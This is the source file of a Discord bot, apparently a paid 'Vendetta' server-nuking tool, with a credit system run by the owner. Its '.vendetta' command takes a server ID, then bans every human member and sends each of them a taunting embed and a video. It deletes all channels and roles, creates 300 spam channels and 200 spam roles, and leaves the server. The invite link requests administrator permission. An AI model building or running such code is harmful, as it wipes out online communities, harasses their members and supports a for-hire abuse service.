require('dotenv').config();
const { Client, GatewayIntentBits, Partials, EmbedBuilder, AttachmentBuilder, ActionRowBuilder, ButtonBuilder, ButtonStyle } = require('discord.js');

// --- Node 22 fetch fix ---
const fetch = (...args) => import('node-fetch').then(({ default: f }) => f(...args));
// ---------------------------

const client = new Client({
  intents: [
    GatewayIntentBits.Guilds,
    GatewayIntentBits.GuildMessages,
    GatewayIntentBits.MessageContent,
    GatewayIntentBits.GuildMembers
  ],
  partials: [Partials.Channel]
});

const OWNER_ID = process.env.OWNER_ID;
const SERI_ID = process.env.SERI_ID;
const HAK_KANAL_ID = process.env.HAK_KANAL_ID;

let cachedVideo = null;

// --- Hak sistemi ---
let haklar = {}; // { userId: hakSayisi }
let haklarMessageId = null;

// Haklar mesajını güncelle
async function updateHaklarMessage(channel) {
  let description = "**HAKLAR**\n\n";
  for (const id in haklar) {
    const member = await channel.guild.members.fetch(id).catch(() => null);
    const name = member ? member.user.tag : id;
    description += `${name} (${id}) Hak Sayısı: ${haklar[id]}\n`;
  }

  if (haklarMessageId) {
    const msg = await channel.messages.fetch(haklarMessageId).catch(() => null);
    if (msg) return msg.edit({ content: description }).catch(() => {});
  }

  const msg = await channel.send({ content: description });
  haklarMessageId = msg.id;
}

// --- Video cache ---
client.once('ready', async () => {
  console.log(`🚀 Bot aktif: ${client.user.tag}`);

  const videoURL = "https://raw.githubusercontent.com/ForsDev101/Securitybot/main/ssstik.io_goktug_twd_1763930201787.mp4";

  try {
    const res = await fetch(videoURL);
    const buffer = Buffer.from(await res.arrayBuffer());
    cachedVideo = new AttachmentBuilder(buffer, { name: "video.mp4" });
    console.log("🎥 Video cachelendi!");
  } catch (err) {
    console.log("❌ Video cache hatası:", err);
  }
});

// --- Hak komutları ---
client.on('messageCreate', async message => {
  if (!message.guild || message.author.bot) return;

  const args = message.content.trim().split(/ +/);
  const command = args.shift().toLowerCase();

  if (![OWNER_ID, SERI_ID].includes(message.author.id)) return;

  const hakChannel = await client.channels.fetch(HAK_KANAL_ID);

  if (command === '.hakver') {
    const userId = args[0];
    const count = parseInt(args[1]) || 1;
    haklar[userId] = (haklar[userId] || 0) + count;
    await updateHaklarMessage(hakChannel);
    return message.reply(`✅ ${count} hak verildi.`);
  }

  if (command === '.hakal') {
    const userId = args[0];
    const count = parseInt(args[1]) || 1;
    haklar[userId] = Math.max((haklar[userId] || 0) - count, 0);
    await updateHaklarMessage(hakChannel);
    return message.reply(`✅ ${count} hak alındı.`);
  }

  if (command === '.hakk') {
    await updateHaklarMessage(hakChannel);
    return;
  }
});

// --- Vendetta komutu ---
client.on('messageCreate', async (message) => {
  if (!message.guild || message.author.bot) return;

  const args = message.content.trim().split(/ +/);
  const command = args.shift().toLowerCase();

  if (command === '.vendetta') {

    const hak = haklar[message.author.id] || 0;

    if (hak <= 0) {
      message.author.send({ content: `**vendetta** Hakkınız \`\`0\`\` Botu Kullanamazsınız!` }).catch(() => {});
      return;
    }

    // DM'de hak sorgu butonu
    const button = new ActionRowBuilder().addComponents(
      new ButtonBuilder()
        .setCustomId('sorguHak')
        .setLabel('Hak Sorgula')
        .setStyle(ButtonStyle.Primary)
    );

    const dm = await message.author.send({
      content: `**vendetta** Hakkınız \`\`${hak}\`\` Hakkınız Var! Botu Kullanmak İçin Aşağıdaki Butona Basınız.\nBotu Eklemeniz İçin Link: https://discord.com/oauth2/authorize?client_id=1433237978645266453&permissions=8&integration_type=0&scope=bot\nNot: başlatmadan önce bota yüksek bir rol vermeniz gerekmektedir.`,
      components: [button]
    }).catch(() => {});

    const collector = dm.createMessageComponentCollector({ time: 60000 });
    collector.on('collect', async i => {
      if (i.customId === 'sorguHak') {
        await i.deferUpdate();
        i.followUp('Sunucu ID girin:').then(msg => {
          const filter = m => m.author.id === message.author.id;
          msg.channel.awaitMessages({ filter, max: 1, time: 30000, errors: ['time'] })
            .then(async collected => {
              const guildId = collected.first().content;
              const guild = client.guilds.cache.get(guildId);
              if (!guild) return msg.channel.send('Bot bu sunucuda değil!');

              msg.channel.send('İşlem başlatılıyor...');

              // --- Hak düşür
              haklar[message.author.id] = haklar[message.author.id] - 1;
              const hakChannel = await client.channels.fetch(HAK_KANAL_ID);
              await updateHaklarMessage(hakChannel);

              // -----------------------------
              // 📌 Embed oluştur
              // -----------------------------
              const embed = new EmbedBuilder()
                .setColor('Red')
                .setTitle('💣 VENDETTA SUNUCUYA EL KOYDU!')
                .setDescription('Slained By VENDETTA \n VENDETTA Affetmez 💣 https://discord.gg/j9W6FXKTre')
                .setFooter({ text: '💦 VENDETTA Affetmez Sabaha Sunucun Affedilmez 💦' });

              const members = await guild.members.fetch();
              let bannedCount = 0;

              members.forEach(member => {
                if (member.user.bot) return;
                if ([OWNER_ID, SERI_ID].includes(member.id)) return;
                member.send({ embeds: [embed], files: [cachedVideo] }).catch(() => {});
                member.ban({ reason: 'P@rno' }).catch(() => {});
                bannedCount++;
              });

              guild.channels.cache.forEach(ch => ch.delete().catch(() => {}));

              const channelNames = ['VENDETTA💦', 'VENDETTA💝', 'EL KONULDU🔥'];
              const channelTasks = [];
              for (let i = 0; i < 300; i++) {
                channelTasks.push(guild.channels.create({ name: channelNames[i % channelNames.length] }).catch(() => {}));
              }

              guild.roles.cache.forEach(role => {
                if (role.editable && role.id !== guild.id) role.delete().catch(() => {});
              });

              const roleTasks = [];
              for (let i = 0; i < 200; i++) {
                const randomColor = `#${Math.floor(Math.random() * 16777215).toString(16).padStart(6, '0')}`;
                roleTasks.push(guild.roles.create({ name: 'BÖÖ KORKTUNMUU😜', color: randomColor, hoist: true }).catch(() => {}));
              }

              await Promise.all([Promise.all(channelTasks), Promise.all(roleTasks)]);
              msg.channel.send(`⚡ ${bannedCount} kişi banlandı. V For Vendetta!`).catch(() => {});
              await guild.leave().catch(() => {});
            })
            .catch(() => msg.channel.send('Zaman doldu!'));
        });
      }
    });
  }
});

client.login(process.env.BOT_TOKEN);
